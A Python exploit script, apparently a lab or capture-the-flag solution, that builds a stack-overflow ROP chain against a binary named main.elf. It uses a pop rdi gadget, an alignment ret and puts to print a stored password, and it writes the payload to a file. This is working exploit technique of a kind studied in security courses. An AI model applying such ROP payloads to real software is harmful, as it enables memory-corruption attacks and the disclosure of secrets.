#!/usr/bin/env python3
import sys
import struct

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(f, v):
    assert isinstance(v, str)
    f.write(v.encode("ascii"))
    f.flush()

def writeBytes(f, v):
    assert isinstance(v, bytes)
    f.write(v)
    f.flush()

def writeLong(f, v):
    assert isinstance(v, int)
    f.write(v.to_bytes(8, 'little'))
    f.flush()

# Use this to debug your attack.
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

# Here we have the address of the main function.
pmain = int(sys.stdin.readline(), 16)

# pmain = 0x401a47 = 4201031 (always the same)

# Offsets from main (computed from GDB + r2):
offset_gadget     = 203377  # 0x4334b8 - 0x401a47 = pop rdi; pop rbp; ret
offset_ret        = 203379  # 0x4334ba - 0x401a47 = ret (stack alignment fix)
offset_puts       = 74233   # p (long)&puts - (long)&main
offset_pwd_string = 640485  # p (long)pwd - (long)&main  (address of "pwd0" string)

# Offset from &content to saved rip in process()
# saved rip at 0x7fffffffd4a8, &content at 0x7fffffffd490 = 24 bytes
offset_content_to_rip = 24

p_gadget     = pmain + offset_gadget
p_ret        = pmain + offset_ret
p_puts       = pmain + offset_puts
p_pwd_string = pmain + offset_pwd_string

eprint(f"pmain        = {hex(pmain)}")
eprint(f"p_gadget     = {hex(p_gadget)}")
eprint(f"p_puts       = {hex(p_puts)}")
eprint(f"p_pwd_string = {hex(p_pwd_string)}")

# ROP chain:
#   [24 bytes padding]: fills content[12] + reaches saved rip
#   [pop rdi; pop rbp; ret gadget]: loads next value into rdi
#   [address of "pwd0" string]: rdi = arg for puts
#   [dummy 8 bytes]: consumed by pop rbp
#   [ret gadget]: aligns stack to 16 bytes before puts
#   [address of puts]: puts(rdi) prints the password
rop_chain = (
    b"A" * offset_content_to_rip +
    p_gadget.to_bytes(8, 'little') +
    p_pwd_string.to_bytes(8, 'little') +
    b"\x00" * 8 +
    p_ret.to_bytes(8, 'little') +
    p_puts.to_bytes(8, 'little')
)

# Write forged file: first line = byte count, then the payload bytes
with open("payload.txt", "wb") as f:
    writeStr(f, f"{len(rop_chain)}\n")
    writeBytes(f, rop_chain)

# Tell main.elf to read this file
print("payload.txt")
